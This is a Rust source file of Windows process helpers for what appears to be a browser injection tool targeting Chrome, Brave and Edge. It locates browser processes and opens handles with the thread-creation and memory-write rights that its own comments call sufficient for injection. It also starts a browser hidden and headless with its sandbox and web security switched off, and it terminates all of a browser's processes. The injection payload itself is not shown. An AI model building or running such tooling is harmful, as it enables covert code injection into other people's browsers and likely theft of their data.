use anyhow::{Result, anyhow};
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::path::PathBuf;
use winapi::shared::minwindef::*;
use winapi::um::handleapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::tlhelp32::*;
use winapi::um::winnt::HANDLE;
use winapi::um::winbase::STARTF_USESHOWWINDOW;
use winapi::um::winuser::SW_HIDE;
use winapi::um::errhandlingapi::GetLastError;

const PROCESS_TERMINATE: u32 = 0x0001;

pub fn find_by_name(process_name: &str) -> Result<Option<u32>> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return Err(anyhow!("Failed to create process snapshot"));
        }

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };

        let mut found_processes = Vec::new();

        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let current_name = OsString::from_wide(&entry.szExeFile)
                    .into_string()
                    .unwrap_or_default()
                    .trim_end_matches('\0')
                    .to_lowercase();

                if current_name == process_name.to_lowercase() {
                    let pid = entry.th32ProcessID;
                    found_processes.push(pid);
                    println!("[*] Found {} process with PID: {}", process_name, pid);
                }

                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        
        if found_processes.is_empty() {
            println!("[-] No running {} process found", process_name);
            return Ok(None);
        }

        // For Edge, try to find the main process (usually the first one or one with specific characteristics)
        // For now, let's try each process until we find one we can access
        if process_name.to_lowercase().contains("msedge") || process_name.to_lowercase().contains("edge") {
            for pid in &found_processes {
                // Quick check if we can open this process
                let test_handle = OpenProcess(winapi::um::winnt::PROCESS_QUERY_INFORMATION, FALSE, *pid);
                if !test_handle.is_null() {
                    CloseHandle(test_handle);
                    println!("[*] Selected accessible {} process with PID: {}", process_name, pid);
                    return Ok(Some(*pid));
                }
            }
            println!("[-] Found {} processes but none are accessible", found_processes.len());
        }

        // Return the first found process for non-Edge browsers
        Ok(Some(found_processes[0]))
    }
}

pub fn open_handle(process_id: u32) -> Result<HANDLE> {
    unsafe {
        // Try with full access first
        let mut handle = OpenProcess(winapi::um::winnt::PROCESS_ALL_ACCESS, FALSE, process_id);

        // If that fails, try with reduced permissions that are usually sufficient for injection
        if handle.is_null() {
            println!("[*] Full access failed for PID {}, trying reduced permissions...", process_id);
            handle = OpenProcess(
                winapi::um::winnt::PROCESS_CREATE_THREAD |
                winapi::um::winnt::PROCESS_QUERY_INFORMATION |
                winapi::um::winnt::PROCESS_VM_OPERATION |
                winapi::um::winnt::PROCESS_VM_WRITE |
                winapi::um::winnt::PROCESS_VM_READ,
                FALSE,
                process_id
            );
        }

        // If reduced permissions also fail, try with minimal permissions for architecture check
        if handle.is_null() {
            println!("[*] Reduced permissions failed for PID {}, trying minimal permissions...", process_id);
            handle = OpenProcess(
                winapi::um::winnt::PROCESS_QUERY_INFORMATION |
                winapi::um::winnt::PROCESS_VM_READ,
                FALSE,
                process_id
            );
        }

        if handle.is_null() {
            let error_code = GetLastError();
            let error_msg = match error_code {
                5 => "Access denied - process may be running with higher privileges",
                87 => "Invalid parameter",
                6 => "Invalid handle",
                _ => "Unknown error"
            };
            
            return Err(anyhow!(
                "Failed to open process handle for PID {} (Error code: {} - {})", 
                process_id, error_code, error_msg
            ));
        }

        println!("[+] Successfully opened handle for PID {}", process_id);
        Ok(handle)
    }
}

pub fn start_browser(executable_path: &PathBuf) -> Result<u32> {
    use winapi::um::processthreadsapi::*;

    unsafe {
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        startup_info.dwFlags = STARTF_USESHOWWINDOW;
        startup_info.wShowWindow = SW_HIDE as u16;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        // Build command line with headless arguments
        let headless_args = " --headless --disable-gpu --no-sandbox --disable-web-security --disable-features=VizDisplayCompositor --disable-extensions --disable-plugins --disable-images --mute-audio --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-renderer-backgrounding";
        let command_line = format!("\"{}\"{}",
            executable_path.to_string_lossy(),
            headless_args
        );
        
        let mut command_line_wide: Vec<u16> = command_line
            .encode_utf16()
            .chain(Some(0))
            .collect();

        let success = CreateProcessW(
            std::ptr::null(),
            command_line_wide.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            FALSE,
            0,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut startup_info,
            &mut process_info,
        );

        if success == 0 {
            return Err(anyhow!("Failed to start browser process"));
        }

        let process_id = process_info.dwProcessId;

        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);

        // Wait a bit for the browser to initialize
        std::thread::sleep(std::time::Duration::from_millis(3000));

        Ok(process_id)
    }
}

pub fn check_architecture_match(process_handle: HANDLE) -> Result<()> {
    let current_arch = get_current_architecture();
    let target_arch = get_process_architecture(process_handle)?;

    if current_arch != target_arch {
        return Err(anyhow!(
            "Architecture mismatch: Injector is {} but target is {}",
            arch_to_string(current_arch),
            arch_to_string(target_arch)
        ));
    }

    Ok(())
}

#[derive(PartialEq, Debug)]
enum Architecture {
    X86,
    X64,
    ARM64,
    Unknown,
}

fn get_current_architecture() -> Architecture {
    if cfg!(target_arch = "x86_64") {
        Architecture::X64
    } else if cfg!(target_arch = "aarch64") {
        Architecture::ARM64
    } else if cfg!(target_arch = "x86") {
        Architecture::X86
    } else {
        Architecture::Unknown
    }
}

fn get_process_architecture(process_handle: HANDLE) -> Result<Architecture> {
    use winapi::um::wow64apiset::*;

    unsafe {
        let mut is_wow64 = FALSE;
        if IsWow64Process(process_handle, &mut is_wow64) == 0 {
            return Err(anyhow!("Failed to check process architecture"));
        }

        // On x64 system:
        // - Native x64 process: is_wow64 = FALSE
        // - WoW64 x86 process: is_wow64 = TRUE

        if is_wow64 != FALSE {
            Ok(Architecture::X86) // WoW64 process
        } else {
            // Could be native x64 or ARM64, assume x64 for now
            // More sophisticated detection would require additional APIs
            Ok(Architecture::X64)
        }
    }
}

fn arch_to_string(arch: Architecture) -> &'static str {
    match arch {
        Architecture::X86 => "x86",
        Architecture::X64 => "x64",
        Architecture::ARM64 => "ARM64",
        Architecture::Unknown => "Unknown",
    }
}

pub fn kill_all_processes_by_name(process_name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return Err(anyhow!("Failed to create process snapshot"));
        }

        let mut process_entry: PROCESSENTRY32W = std::mem::zeroed();
        process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        let mut killed_count = 0;

        if Process32FirstW(snapshot, &mut process_entry) != 0 {
            loop {
                let current_process_name = String::from_utf16_lossy(
                    &process_entry.szExeFile[..process_entry
                        .szExeFile
                        .iter()
                        .position(|&x| x == 0)
                        .unwrap_or(process_entry.szExeFile.len())],
                );

                if current_process_name.to_lowercase() == process_name.to_lowercase() {
                    // Open process with terminate rights
                    let process_handle =
                        OpenProcess(PROCESS_TERMINATE, FALSE, process_entry.th32ProcessID);

                    if process_handle != std::ptr::null_mut() {
                        if TerminateProcess(process_handle, 0) != 0 {
                            killed_count += 1;
                        }
                        CloseHandle(process_handle);
                    }
                }

                if Process32NextW(snapshot, &mut process_entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
        Ok(killed_count)
    }
}

pub fn kill_browser_processes(browser_type: &str) -> Result<u32> {
    let process_names = match browser_type.to_lowercase().as_str() {
        "chrome" => vec!["chrome.exe"],
        "brave" => vec!["brave.exe"],
        "edge" => vec!["msedge.exe"],
        _ => {
            return Err(anyhow!("Unsupported browser type: {}", browser_type));
        }
    };

    let mut total_killed = 0;
    for process_name in process_names {
        match kill_all_processes_by_name(process_name) {
            Ok(count) => {
                total_killed += count;
                if count > 0 {}
            }
            Err(e) => {
                println!("[#] Failed to terminate {}: {}", process_name, e);
            }
        }
    }

    Ok(total_killed)
}
